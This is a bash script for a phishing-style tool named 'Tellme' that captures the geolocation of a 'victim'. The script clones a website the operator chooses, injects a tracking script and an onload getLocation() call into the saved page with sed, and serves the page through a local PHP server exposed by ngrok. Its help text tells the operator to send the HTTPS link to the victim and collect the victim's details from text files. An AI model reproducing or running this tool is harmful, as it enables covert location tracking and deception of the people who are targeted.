function tellmehelp(){
printf """\n+++++++++++++++++\e[31m TELLME HELP \e[0m++++++++++++++++++"""
printf """\nTellme is a simple tool to get the location of the 
victim using a phishing like attack."""
printf """\n\nSteps:
    
    [01] Choose the \e[31mStart option\e[0m and enter the link of a website you want to redirect
         the victim.
    
    [02] Then open the link in browser and allow to load.
    
    [03] Press \e[31mCtl+S\e[0m to save the webpage.   
    
    [04] Save the webpage inside the \e[31mTellme\Main\e[0m directory.
    
    [05] Then run \e[31mPost process\e[0m allow it to finish.
    
    [06] Then run \e[31mStart server\e[0m allow the server to start
    
    [07] Then send the \e[31mHTTPS\e[0m link to the victim
         dont send HTTP link. For some security reasons it wont work.
    
    [08] When the user connects it will show on the terminal
    
    [08] After the successfull atempt the details of the victim will
         be stored in Tellme/Main/Files in some text files
    
    [09] \e[31mCtl+C\e[0m to abort server
    
Author: \e[31mpr0fsr\e[0m
Mail: \e[31mpr0fsr007@gmail.com\e[0m
    
\e[36m++++++++++++++ Happy Hacking xD ++++++++++++++++++++\e[0m """

getoption
}
function linker(){
printf '\e[31m\nLink: \e[0m'
read -r link
url="header('Location:https://$link');#"
sed -i "s|header('|${url}|g" Main/getter.php
echo
echo -e "Open this url in browser and save the webpage as index.html in Tellme\Main directory using Ctl+S"
echo -e "                       URL: \e[1:33m$link\e[0m"
echo -e "\e[36m\nThen run post process\e[0m"
sleep 3
while((1==1))
do
clear
echo -e "\e[36m\nGo back and run post process\e[0m"
echo -e "\e[31m\n\n[-] Press 0 to go back\e[0m"
printf "\e[36m\n\nOption: \e[0m"
read -r options
if((options==0))
then 
clear
getoption
fi
done
}
function startserver(){
printf 'Port: '
read -r port
echo
echo -e "\e[31mStarting server on\e[0m $port  "
php -t "Main/" -S 127.0.0.1:$port > /dev/null 2>&1 & sleep 3
echo -e "\e[31mStarting Ngrok in 5 seconds...\e[0m" 
echo -e "\e[31mSend the https link to the victim!\e[0m"
echo  
echo -e "Press \e[31mCtl+C\e[0m to abort Ngrok" & sleep 7
./ngrok http $port 
clear
getoption
}
function changevalue(){
sed -i "s|<body> |<body onload='getLocation()'> |g" Main/index.html
sed -i "s|</head>|<script src='tellme.js'></script></head>|g" Main/index.html
sed -i "s|<body |<body onload='getLocation()' |g" Main/index.html
sed -i "s|    <body>|<body onload='getLocation()'> |g" Main/index.html
echo
echo -n -e 'Processing.\r'
    sleep 1
    echo -n -e 'Processing..\r'
    sleep 1
    echo -n -e 'Processing...\r'
    sleep 1
    echo -n -e 'Processing....\r'
    sleep 1
    echo -n -e 'Processing.....\r'
    sleep 1
    echo -n -e '                 \r' 
    sleep 2
while((1==1))
do
clear
echo -e '\e[31mProcess completed!\e[0m now go back and start the server'
echo -e "\e[31m\n\n[-] Press 0 to go back \e[0m"
printf "\e[36m\n\nOption: \e[0m"
read -r options
if((options==0))
then 
clear
getoption
fi
done
}
function showbanner(){
echo
echo
printf """           ____  ____  __    __    __  __  ____ 
          (_  _)( ___)(  )  (  )  (  \/  )( ___)
            )(   )__)  )(__  )(__  )    (  )__) 
           (__) (____)(____)(____)(_/\/\_)(____)  Author: pr0fsr
                                                  pr0fsr007@gmail.com


"""
}
function getoption(){
showbanner
printf "\e[36m+++++++++++++++++++++++++ MENU +++++++++++++++++++++++++\e[0m"
printf "\e[31m\n  [01] Start\n  [02] Post process\n  [03] Start server\n  [04] Help\n  [99] Exit\e[0m"
printf "\e[36m\n\nOption: \e[0m"
read -r options
if((options==01))||((options==1))
then
linker
elif((options==02))||((options==2))
then
changevalue
elif((options==03))||((options==3))
then
startserver
elif((options==04))||((options==4))
then
tellmehelp
elif((options==99))
then
exit
else
echo "Invalid option!"
sleep 2
clear 
getoption
fi
}
getoption
